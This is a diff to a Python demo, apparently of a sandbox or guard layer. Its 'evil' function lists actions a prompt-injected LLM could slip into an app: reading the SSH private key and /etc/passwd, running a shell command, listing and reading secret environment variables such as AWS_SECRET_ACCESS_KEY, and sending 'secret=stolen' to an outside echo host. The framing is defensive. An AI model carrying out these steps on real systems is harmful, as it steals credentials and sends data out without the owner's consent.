@@ -43,10 +43,10 @@ def evil() -> None:
     """What a prompt-injected or hallucinating LLM could slip into the same application."""
     step("read an SSH key", lambda: (Path.home() / ".ssh" / "id_rsa").read_text()[:30])
     step("read /etc/passwd", lambda: Path("/etc/passwd").read_text().splitlines()[0])
-    step("run a shell command", lambda: f"exit code {os.system('id')}")
+    step("run a shell command", lambda: f"exit code {os.system('true')}")
     step("list secrets in the environment", lambda: ", ".join(k for k in os.environ if "KEY" in k or "SECRET" in k))
     step("read $AWS_SECRET_ACCESS_KEY", lambda: f"{os.environ['AWS_SECRET_ACCESS_KEY'][:3]}...")
-    step("exfiltrate", lambda: fetch_title("https://httpbin.org/anything?secret=stolen"))
+    step("exfiltrate", lambda: fetch_title("https://postman-echo.com/get?secret=stolen"))
 
 
 def main() -> None:
